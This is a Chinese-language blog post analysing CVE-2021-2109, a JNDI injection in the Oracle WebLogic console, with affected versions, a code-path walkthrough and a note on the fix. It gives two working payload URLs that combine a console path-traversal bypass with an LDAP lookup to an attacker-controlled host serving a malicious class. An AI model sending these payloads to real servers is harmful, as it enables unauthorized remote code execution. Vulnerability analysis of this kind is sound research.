---
title: Weblogic JNDI 注入
date: 2026-10-10
---

# Weblogic JNDI 注入

## 环境搭建

还是之前使用的 Weblogic 环境，不过在调试的时候需要手动把`\server\lib\consoleapp\webapp\WEB-INF\lib\console.jar`添加到依赖中。

## 漏洞分析与复现

### 影响版本和前提条件

Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0。

前提：拥有访问 `/console/consolejndi.portal` 页面的用户权限，或者存在 CVE-2020-14883 未授权访问漏洞。

### 漏洞原理

WebLogic 的 `/console/consolejndi.portal` 接口可以调用存在 JNDI 注入漏洞的 `com.bea.console.handles.JndiBindingHandle` 类，从而造成 RCE。

### 漏洞复现

payload：`http://127.0.0.1:7001/console/css/%252e%252e%252fconsolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://127.0.0;1:1389/aew0xy;AdminServer%22)`

本地开启一个 JNDI 的Evil Class 和 Server。

![1](https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/Evil.png)

![1](https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/CalcSuccess.png)



这里使用的是别人复现时的图片，自己用 kali 来复现是不太一样的，用 kali 复现的时候建议使用 DNSLog，这样能清楚地看到命令是否正常执行。

### 漏洞分析

根据 payload 分析，先从`consolejndi.portal`开始看起，`.portal`文件就类似于一个 Servlet，在`consolejndi.portal`中存在 JNDI Binding 操作的处理容器：

![1](https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/JNDIBindingPageGeneral.png)

具体的处理逻辑在`/PortalConfig/jndi/jndibinding.portlet`：

![1](https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/jndibinding.png)

去到`com.bea.console.actions.jndi.JNDIBindingAction`类中，发现存在一个`execute()`方法，疑似存在 JNDI 注入。

观察需要如何构造 payload，`c`是由`ConsoleUtils.initNamingContext(serverMBean)`得来的，而`serverMBean`是通过`domainMBean.lookupServer(serverName)`得来的，其中一系列关系：

![1](https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/ValueRoute.png)

接着从上往下看代码，先是强转了一个`JndiBindingHandle`类，这里`getHandleContext()`逻辑不复杂，最终会调用到`JndiBindingHandle`的构造方法。

![1](https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/JndiBindingHandleStruct.png)

我们在 payload 中的这一段被放进构造方法的`type`和`objectIdentifier`中。

继续往下可能，如果我们想要进入 JNDI 注入的代码需要满足两个条件，一个是`serverMBean != null`，另一个是`c != null`，我们进到`serverMBean`看一下代码逻辑。

`lookupServer`是`DomainMBean`接口的方法，我们去看一下它的实现类：

![1](https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/DomainMBeanImpl.png)

这里似乎存在动态代理调用，但是我实在是没找到对应的类，就干脆不研究了。

![1](https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/lookupServer.png)

我们需要走到循环中，返回`var3`。这里`var2`的值就是`AdminServer`。

![1](https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/ServersZero.png)

这里要求我们输入的`var1`和`AdminServer`相同，`var1`其实就是我们输入的`serverName`。而`serverName`其实也是可控的。

![1](https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/componentsControl.png)

这样`serverBean != null`没问题，接下来就是看 JNDI 的 lookup 的地址是否可控，很明显是可控的

![1](https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/jndiControl.png)

我们跟进到`JndiBindingHandle`看一下`set/getComponents()`的逻辑，先调用了`HandleImpl#getComponent`。

![1](https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/HandleImpl.png)

继续跟进。

![1](https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/HandleImplAgain.png)

主要逻辑就是，以`;`分割，这样一来我们就可控`context`和`binding`，进行 JNDI 注入。

整体条件：

1. 用`;`隔开 JNDI 地址
2. `serverName`必须是`AdminServer`

## 漏洞修复

主要是对 JNDI 的黑名单进行了判断。

![1](https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/LookupName.png)

## 总结

先看一下我实际复现时解码的 payload：`http://192.168.110.128:7001/console/css/../consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle("ldap://10.0.0;10:1389/remoteExploit7;AdminServer")`

这里关注一下`JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle("ldap://10.0.0;10:1389/remoteExploit7;AdminServer")`这个参数。

当我们传入这个参数时`HandleFactory`会分离类和参数，然后反射调用来实例化`JndiBindingHandle`并把我们的 LDAP 传进去。

实际上 Weblogic 在处理请求的时候会用一个`BreadcrumbBacking`来管理页面导航和参数，它会扫描请求中所有以`handle`结尾的参数，把`JNDIBindingPortlethandle`的值给收集起来，然后交给`HandleFactory.getHandle()`来实例化`JndiBindingHandle`对象。

Weblogic 控制台页面由多个`Portlet`组成，而`JNDIBindingPageGeneral`这个页面中有一个 Portlet 的名字和`JndiBindingHandle`关联，当框架解析出 `JndiBindingHandle` 后，会把它和对应的 Portlet 绑定，并确定这个 Portlet 要执行的动作是 `JNDIBindingAction`。然后就会调用到`JNDIBindingAction.execute()`，从`JndiBindingHandle`中取出 JNDI 然后调用`lookup()`。

所以整条链是：
**请求参数 → BreadcrumbBacking 收集 → HandleFactory 解析出 JndiBindingHandle → 绑定到 JNDIBindingPortlet → 触发 JNDIBindingAction.execute() → lookup(恶意LDAP) → JNDI注入**。















































